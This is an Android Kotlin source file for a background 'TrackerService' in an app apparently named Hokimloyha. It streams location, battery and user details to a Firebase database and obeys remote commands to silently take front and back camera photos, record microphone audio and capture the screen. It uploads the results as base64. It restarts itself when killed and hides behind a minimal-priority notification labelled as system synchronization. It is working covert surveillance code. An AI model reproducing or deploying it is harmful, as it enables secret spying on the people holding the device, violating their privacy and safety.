package com.hokimloyha.app.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.location.LocationManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.gson.Gson
import com.hokimloyha.app.R
import com.hokimloyha.app.model.User
import java.io.File
import java.util.concurrent.Executors

class TrackerService : Service() {

    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var database: FirebaseDatabase? = null
    private var locationRef: DatabaseReference? = null
    private var commandsRef: DatabaseReference? = null
    private var mediaRef: DatabaseReference? = null
    private var locationCallback: LocationCallback? = null

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var lastSavedLat: Double = 0.0
    private var lastSavedLon: Double = 0.0
    private var lastLocationUploadTime: Long = 0L

    private val serviceExecutor = Executors.newSingleThreadExecutor()
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private var currentDeviceId: String = "hokim"

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            try {
                val devId = getActiveDeviceId()
                val now = System.currentTimeMillis()
                database?.getReference("tracking/devices/$devId/heartbeat")?.setValue(now)
                checkGpsAndBatteryStatus(devId)
            } catch (_: Exception) {}
            heartbeatHandler.postDelayed(this, 15000L)
        }
    }

    companion object {
        const val CHANNEL_ID = "hokimloyha_tracking_channel"
        const val NOTIFICATION_ID = 1001
        private const val TAG = "TrackerService"
    }

    fun getActiveDeviceId(): String {
        val prefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
        val userJson = prefs.getString("current_user", null)
        if (!userJson.isNullOrEmpty()) {
            try {
                val u = Gson().fromJson(userJson, User::class.java)
                if (u != null && u.username.isNotBlank()) {
                    currentDeviceId = u.username
                    return u.username
                }
            } catch (_: Exception) {}
        }
        return currentDeviceId
    }

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        try {
            database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
            val devId = getActiveDeviceId()
            locationRef = database?.getReference("tracking/devices/$devId/location")
            commandsRef = database?.getReference("tracking/devices/$devId/commands")
            mediaRef = database?.getReference("tracking/devices/$devId/media")

            commandsRef?.keepSynced(true)

            listenToAdminCommands()
            updateDeviceInfo(devId)
            heartbeatHandler.post(heartbeatRunnable)
        } catch (e: Exception) {
            Log.e(TAG, "Firebase init error", e)
        }
        createNotificationChannel()
    }

    private fun updateDeviceInfo(devId: String) {
        val prefs = getSharedPreferences("hokim_app_prefs", MODE_PRIVATE)
        val userJson = prefs.getString("current_user", null)
        if (!userJson.isNullOrEmpty()) {
            try {
                val u = Gson().fromJson(userJson, User::class.java)
                val info = mapOf(
                    "userId" to u.id,
                    "username" to u.username,
                    "fullName" to u.fullName,
                    "role" to u.role.name,
                    "position" to (u.position ?: "Xodim"),
                    "phone" to (u.phone ?: ""),
                    "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "updatedAt" to System.currentTimeMillis()
                )
                database?.getReference("tracking/devices/$devId/info")?.setValue(info)
            } catch (_: Exception) {}
        }
    }

    private fun checkGpsAndBatteryStatus(devId: String) {
        try {
            val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
            val isGpsOn = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                          locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
            mediaRef?.child("gps_enabled")?.setValue(isGpsOn)

            // Batareya foizini aniqlash
            val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryIntent = registerReceiver(null, batteryFilter)
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) {
                val batteryPct = (level * 100) / scale
                database?.getReference("tracking/devices/$devId/info/battery")?.setValue(batteryPct)
            }
        } catch (_: Exception) {}
    }

    private fun acquireWakeLock(durationMs: Long = 15000L) {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            if (wakeLock == null) {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hokimloyha:TrackerWakeLock")
            }
            if (wakeLock?.isHeld == false) {
                wakeLock?.acquire(durationMs)
            }
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock error", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restartServiceIntent = Intent(applicationContext, TrackerService::class.java).also {
                it.setPackage(packageName)
            }
            val restartServicePendingIntent = PendingIntent.getService(
                this, 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmService = getSystemService(ALARM_SERVICE) as AlarmManager
            alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent
            )
        } catch (e: Exception) {
            Log.e(TAG, "onTaskRemoved watchdog error", e)
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = createNotification()

        val devId = getActiveDeviceId()
        locationRef = database?.getReference("tracking/devices/$devId/location")
        commandsRef = database?.getReference("tracking/devices/$devId/commands")
        mediaRef = database?.getReference("tracking/devices/$devId/media")
        updateDeviceInfo(devId)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
            } catch (_: Exception) {
                startForeground(NOTIFICATION_ID, notification)
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                )
            } catch (_: Exception) {
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        startTrackingLocation()
        return START_STICKY
    }

    private var lastHandledPhotoTimestamp = 0L
    private var lastHandledScreenTimestamp = 0L

    private fun listenToAdminCommands() {
        commandsRef?.child("take_photo")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val timestamp = snapshot.getValue(Long::class.java) ?: 0L
                if (timestamp > 0L && timestamp != lastHandledPhotoTimestamp) {
                    lastHandledPhotoTimestamp = timestamp
                    capturePhotosSilently()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        commandsRef?.child("record_audio")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val shouldRecord = snapshot.getValue(Boolean::class.java) ?: false
                if (shouldRecord && !isRecording) {
                    startAudioRecording()
                } else if (!shouldRecord && isRecording) {
                    stopAudioRecording()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        commandsRef?.child("record_screen")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val ts = snapshot.getValue(Long::class.java) ?: 0L
                if (ts > 0L && ts != lastHandledScreenTimestamp) {
                    lastHandledScreenTimestamp = ts
                    triggerScreenCapture()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        commandsRef?.child("request_gps")?.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val ts = snapshot.getValue(Long::class.java) ?: 0L
                if (ts > 0L) {
                    requestImmediateLocation()
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun triggerScreenCapture() {
        val devId = getActiveDeviceId()
        try {
            // Agar media projection ruxsati berilgan bo'lsa -> ScreenRecordService ni ishga tushiramiz
            if (AppStateTracker.mediaProjectionIntent != null) {
                val recIntent = Intent(this, ScreenRecordService::class.java).apply {
                    action = ScreenRecordService.ACTION_START
                    putExtra("device_id", devId)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(recIntent)
                } else {
                    startService(recIntent)
                }
            } else {
                // Media projection yo'q bo'lsa -> zudlik bilan ekran skrinshotini olamiz
                ScreenCaptureHelper.captureScreenshot(this, devId)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Screen record trigger error", e)
            ScreenCaptureHelper.captureScreenshot(this, devId)
        }
    }

    private fun requestImmediateLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc ->
                if (loc != null) {
                    saveLocationIfChanged(loc.latitude, loc.longitude, force = true)
                }
            }
        }
    }

    private fun trimFirebaseArchive(ref: DatabaseReference, maxCount: Int) {
        ref.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val children = snapshot.children.toList()
                if (children.size > maxCount) {
                    val excessCount = children.size - maxCount
                    for (i in 0 until excessCount) {
                        children[i].ref.removeValue()
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun capturePhotosSilently() {
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                mediaRef?.child("status")?.setValue("Xatolik: Kamera ruxsati yo'q!")
                return
            }

            acquireWakeLock(20000L)
            mediaRef?.child("status")?.setValue("📷 Rasmga olinmoqda...")

            val cameraIdBack = manager.cameraIdList.firstOrNull {
                manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            } ?: manager.cameraIdList[0]

            val cameraIdFront = manager.cameraIdList.firstOrNull {
                manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: cameraIdBack

            takeSingleCamera2Photo(manager, cameraIdBack) { backBase64 ->
                takeSingleCamera2Photo(manager, cameraIdFront) { frontBase64 ->
                    if (backBase64 == null && frontBase64 == null) {
                        // Agar Camera2 to'g'ridan-to'g'ri ishlamasa, shaffof CameraActivity orqali olamiz
                        val intent = Intent(this, CameraActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            putExtra("device_id", getActiveDeviceId())
                        }
                        startActivity(intent)
                        releaseWakeLock()
                        return@takeSingleCamera2Photo
                    }

                    val archiveItem = mapOf(
                        "back_base64" to (backBase64 ?: ""),
                        "front_base64" to (frontBase64 ?: ""),
                        "timestamp" to System.currentTimeMillis()
                    )
                    val photosRef = mediaRef?.child("archive_photos")
                    photosRef?.push()?.setValue(archiveItem)?.addOnCompleteListener { task ->
                        releaseWakeLock()
                        if (task.isSuccessful) {
                            mediaRef?.child("latest_photo")?.setValue(archiveItem)
                            mediaRef?.child("status")?.setValue("📷 Rasm olindi va saqlandi!")
                            if (photosRef != null) {
                                trimFirebaseArchive(photosRef, 15)
                            }
                        } else {
                            mediaRef?.child("status")?.setValue("Xatolik: ${task.exception?.message}")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            releaseWakeLock()
            Log.e(TAG, "Silent photo error", e)
            mediaRef?.child("status")?.setValue("Kamera xatosi: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun takeSingleCamera2Photo(manager: CameraManager, cameraId: String, callback: (String?) -> Unit) {
        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val characteristics = manager.getCameraCharacteristics(cameraId)
                        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        val largestSize = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height } ?: Size(640, 480)

                        val reader = ImageReader.newInstance(largestSize.width, largestSize.height, ImageFormat.JPEG, 1)
                        reader.setOnImageAvailableListener({ imReader ->
                            val image = imReader.acquireLatestImage()
                            if (image != null) {
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                image.close()

                                val base64Img = Base64.encodeToString(bytes, Base64.DEFAULT)
                                camera.close()
                                callback(base64Img)
                            } else {
                                camera.close()
                                callback(null)
                            }
                        }, null)

                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(reader.surface)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }
                                    session.capture(captureBuilder.build(), null, null)
                                } catch (_: Exception) {
                                    camera.close()
                                    callback(null)
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close()
                                callback(null)
                            }
                        }, null)
                    } catch (e: Exception) {
                        camera.close()
                        callback(null)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    callback(null)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    callback(null)
                }
            }, null)
        } catch (e: Exception) {
            callback(null)
        }
    }

    private var audioRecordStartTime: Long = 0L

    private fun startAudioRecording() {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                mediaRef?.child("audio_status")?.setValue("Mikrofon ruxsati berilmagan")
                return
            }

            acquireWakeLock(180000L)
            val audioFile = File(filesDir, "audio_record.3gp")
            if (audioFile.exists()) audioFile.delete()

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            audioRecordStartTime = System.currentTimeMillis()
            isRecording = true
            mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz yozish boshlandi...")
        } catch (e: Exception) {
            releaseWakeLock()
            Log.e(TAG, "Audio start error", e)
            isRecording = false
            mediaRef?.child("audio_status")?.setValue("Ovoz xatosi: ${e.localizedMessage}")
        }
    }

    private fun stopAudioRecording() {
        serviceExecutor.execute {
            try {
                val elapsed = System.currentTimeMillis() - audioRecordStartTime
                if (elapsed < 1000L) {
                    try { Thread.sleep(1000L - elapsed) } catch (_: Exception) {}
                }

                try {
                    mediaRecorder?.stop()
                } catch (e: Exception) {
                    Log.w(TAG, "MediaRecorder stop: ${e.message}")
                }
                try {
                    mediaRecorder?.release()
                } catch (_: Exception) {}
                mediaRecorder = null
                isRecording = false

                val audioFile = File(filesDir, "audio_record.3gp")
                if (audioFile.exists() && audioFile.length() > 0) {
                    val bytes = audioFile.readBytes()
                    audioFile.delete()
                    val base64Audio = Base64.encodeToString(bytes, Base64.NO_WRAP)

                    val now = System.currentTimeMillis()
                    val archiveAudio = mapOf(
                        "audio_base64" to base64Audio,
                        "timestamp" to now
                    )
                    mediaRef?.child("latest_audio")?.setValue(archiveAudio)
                    val audioRef = mediaRef?.child("archive_audio")
                    audioRef?.push()?.setValue(archiveAudio)?.addOnCompleteListener { task ->
                        releaseWakeLock()
                        if (task.isSuccessful) {
                            mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz saqlandi (${bytes.size / 1024} KB)")
                            if (audioRef != null) {
                                trimFirebaseArchive(audioRef, 15)
                            }
                        } else {
                            mediaRef?.child("audio_status")?.setValue("Ovoz saqlash xatosi")
                        }
                    }
                } else {
                    releaseWakeLock()
                    try { audioFile.delete() } catch (_: Exception) {}
                }
            } catch (e: Exception) {
                releaseWakeLock()
                Log.e(TAG, "Audio stop error", e)
            }
        }
    }

    private fun startTrackingLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { location ->
                if (location != null && locationRef != null) {
                    saveLocationIfChanged(location.latitude, location.longitude)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "lastLocation error", e)
        }

        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_BALANCED_POWER_ACCURACY,
            15000L
        ).setMinUpdateIntervalMillis(10000L)
         .setMinUpdateDistanceMeters(5.0f)
         .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                val lastLoc = locationResult.lastLocation
                if (lastLoc != null) {
                    saveLocationIfChanged(lastLoc.latitude, lastLoc.longitude)
                }
            }
        }

        try {
            fusedLocationClient?.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
        } catch (e: Exception) {
            Log.e(TAG, "Location updates request error", e)
        }
    }

    private fun saveLocationIfChanged(lat: Double, lon: Double, force: Boolean = false) {
        val now = System.currentTimeMillis()
        val latDiff = Math.abs(lat - lastSavedLat)
        val lonDiff = Math.abs(lon - lastSavedLon)

        if (force || latDiff > 0.00005 || lonDiff > 0.00005 || now - lastLocationUploadTime > 30000L) {
            lastSavedLat = lat
            lastSavedLon = lon
            lastLocationUploadTime = now
            val correctLocationData = mapOf(
                "lat" to lat.toString(),
                "lon" to lon.toString(),
                "timestamp" to now
            )
            locationRef?.setValue(correctLocationData)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        releaseWakeLock()
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient?.removeLocationUpdates(locationCallback!!)
        }
        if (isRecording) {
            stopAudioRecording()
        }
        try {
            val audioFile = File(filesDir, "audio_record.3gp")
            if (audioFile.exists()) audioFile.delete()
        } catch (_: Exception) {}
        try {
            serviceExecutor.shutdown()
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Tizim xizmatlari",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Xizmatlar orqa fonda sinxronlashmoqda"
                setShowBadge(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Ijro Tizimi")
            .setContentText("Sinxronizatsiya faol")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
